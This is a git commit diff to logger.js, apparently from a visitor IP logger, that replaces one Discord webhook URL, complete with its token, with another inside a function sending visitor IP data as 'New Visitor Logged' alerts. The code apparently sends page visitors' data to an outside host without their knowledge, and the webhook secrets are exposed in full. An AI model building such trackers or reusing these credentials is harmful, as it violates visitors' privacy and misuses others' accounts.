0ed61e383f875e91302d9f36192793a6af538d8a
hackersclub29 <57355685+hackersclub29@users.noreply.github.com>
2025-01-29 11:39:13 +0530

    Update logger.js

--- logger.js
+++ logger.js
@@ -41,7 +41,7 @@ function setDefaultData() {
 
 // Function to send data to Discord webhook
 async function sendToDiscord(ipData) {
-    const webhookURL = "https://discord.com/api/webhooks/1334040724907229225/UIP3N7KqAXiQYMrH07LZkeJT1-P6Uv6XYJfsu-_nsajzP3nM69-gfY8T9sz5YZvT-0SU";  // Replace with your Discord webhook
+    const webhookURL = "https://discord.com/api/webhooks/1334042370647523338/x6CnYaHfr1ZHGObQAFpF9o5IWbNdhVmhRjxbrTq9iwM5g53H1QnItjuXE1Cpj9qDs9nr";  // Replace with your Discord webhook
 
     const embed = {
         title: "🔍 New Visitor Logged",
